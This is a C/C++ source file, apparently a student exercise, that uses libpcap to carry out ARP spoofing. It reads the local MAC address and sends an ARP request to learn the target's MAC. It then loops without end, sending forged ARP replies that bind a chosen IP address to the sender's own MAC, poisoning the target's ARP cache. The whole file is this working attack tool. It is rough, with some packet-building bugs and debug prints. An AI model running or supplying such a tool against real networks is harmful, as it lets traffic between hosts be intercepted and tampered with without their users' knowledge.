#include <stdlib.h>
#include <cstring>
#include <iostream>
#include <stdio.h>
#include <pcap/pcap.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "header.h"



void getMacAddress(char *interface, unsigned char * my_mac){
	int sock_mac = socket(PF_INET, SOCK_DGRAM, 0);
	struct ifreq req_mac;
	//memset(&req_mac, 0, sizeof(req_mac));
        strncpy(req_mac.ifr_name, interface, IF_NAMESIZE - 1);
	ioctl(sock_mac, SIOCGIFHWADDR, &req_mac);	
	close(sock_mac);
	memmove((void*)&my_mac[0],(void*)&req_mac.ifr_hwaddr.sa_data[0],6);
}

void setPacket(struct ether_h *e_h, struct arp_hdr *a_h, struct ARP_Spoof *ARP_Sp){

	/* make the BroadCast Packet into EtherNet Header */
	memcpy(e_h->ether_dst_mac, ARP_Sp->ether_dst_mac , 6);
	memcpy(e_h->ether_src_mac, ARP_Sp->ether_src_mac, 6);
	e_h->ether_type = htons (0x806);

	/* make the BroadCast Packet into ARP Header */
	a_h->hardware_type = htons (0x1); /* 1 is arp request packet */
	a_h->proto_type = htons (0x800);
	a_h->hard_add_len = /*htoni*/ (0x6);
	a_h->proto_add_len = /*htoni*/ (0x4);  
	a_h->opcode = ARP_Sp->opcode;        //arp_h.opcode = htons(0x1);
	
	memcpy(a_h->send_mac, ARP_Sp->ether_src_mac, 6 );
	a_h->ip_src = ARP_Sp->ip_src;
	memcpy(a_h->dst_mac, ARP_Sp->ether_dst_mac, 6 );
	a_h->ip_dst = ARP_Sp->ip_dst;
}

void sendRequestPacket(struct ether_h et_h, struct arp_hdr arp_h, pcap_t* handle )
{

	u_char packet[60];
	//TODO set arp header
        //TODO set arp pacekt
	//TODO

	//setting packet file 
	memcpy(packet ,&et_h ,14);
        //memcpy(packet+14 ,&arp_h ,28);  //why
	memcpy(packet+14 ,&arp_h ,14);
	memcpy(packet+28 ,&arp_h.ip_src ,4); //src ip
	memcpy(packet+32 ,&arp_h.dst_mac ,6);
	memcpy(packet+38 ,&arp_h.ip_dst ,4); //dst ip
	
 	//send arp request packet

	printf("packet send\n");
	pcap_sendpacket(handle, packet, 60 /* size */);
}

int check_ARP_Reply(pcap_t *handle,  struct ARP_Spoof *spoof_info){
	int i;
	struct ether_h *et_h, *tmp_eth_h;
        struct arp_hdr *arp_h, *tmp_arp_h;;	
	//struct ARP_Spoof spoof_info;
	while (true) {
		struct pcap_pkthdr* header;
    		const u_char* packet;
    		int res = pcap_next_ex(handle, &header, &packet);
    		
		
    		if (res == 0) continue;
    		if (res == -1 || res == -2) break;

    		et_h = (struct ether_h *)packet;
		//ETHERTYPE_IP 0x800
    		//if ( ntohs(et_h->ether_type) == ETHERTYPE_IP){
		//ETHERTYPE_ARP 0x806
    		if (htons(et_h->ether_type) == ETHERTYPE_ARP){
			//packet += sizeof(struct ether_h);
			//packet += 14;
			arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_h));
			if (memcmp((void*)&spoof_info->ip_dst, (void*)&arp_h->ip_src, 4) ==0){
				printf("\n\n\n\n\n\n\nsame\n\n\n\n\n\n");
				return 0;
			}
			//printf("%s\n\n\n\n\n",inet_aton(arp_h->ip_src));
			//if ()
			//if (arp_h->)
			//TODO IP Adress compare			
			//arp_h->ip_src
			//ip_addr
			//if (ip eq )			
			memcpy(spoof_info->ether_dst_mac, et_h->ether_src_mac, 6);
			break;
    		}

	}


}


int main(int argc, char *argv[])
{
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[60];
	int i;
        
	char *dev = argv[1];
        /* Check the validity of the command line */
    	if (argc != 4){
        	printf("usage: %s interface (e.g. 'rpcap://eth0')", argv[0]);
        	return -1;
    	}
        
	/* Open the output device */
    	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	if (handle == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    		return -1;
  	}
        
	/* get the my Device MAC Address*/
	unsigned char myMac[6];
	getMacAddress(dev, myMac); //dev ens33 wlan0
	

 
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq req;

        if (sock < 0) {

                perror("socket");

                exit(EXIT_FAILURE);

        }
        memset(&req, 0, sizeof(req));
	req.ifr_addr.sa_family = AF_INET;

        std::strncpy(req.ifr_name, argv[1], IF_NAMESIZE - 1);
        //if (ioctl(sock, SIOCGIFHWADDR, &req) < 0 && ioctl(sock, SIOCGIFADDR, &req) < 0) {
        //        perror("ioctl");
        //        exit(EXIT_FAILURE);
        //}
        ioctl(sock, SIOCGIFHWADDR, &req);
        ioctl(sock, SIOCGIFADDR, &req);
        close(sock);

	//TODO Setting ARP Packet & send Request ARP Packet  

	struct ether_h et_h;
        struct arp_hdr arp_h;	
	struct ARP_Spoof spoof_info;
	
	//Test

	
	char broadCast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

	memcpy(spoof_info.ether_dst_mac, broadCast , 6 );
	memcpy(spoof_info.ether_src_mac, myMac , 6 );
	spoof_info.ip_src = inet_addr(argv[2]);	
	spoof_info.ip_dst = inet_addr(argv[3]);
	spoof_info.opcode = htons(0x01);	

	setPacket(&et_h, &arp_h, &spoof_info);
	sendRequestPacket(et_h, arp_h, handle);

	//TODO Recive ARP Packet
	check_ARP_Reply(handle, &spoof_info);

	spoof_info.opcode = htons(0x02);	
	
	setPacket(&et_h, &arp_h, &spoof_info);
	while(1){
		printf("test\n");
		sendRequestPacket(et_h, arp_h, handle);
	}
	
	return 0;
   
}
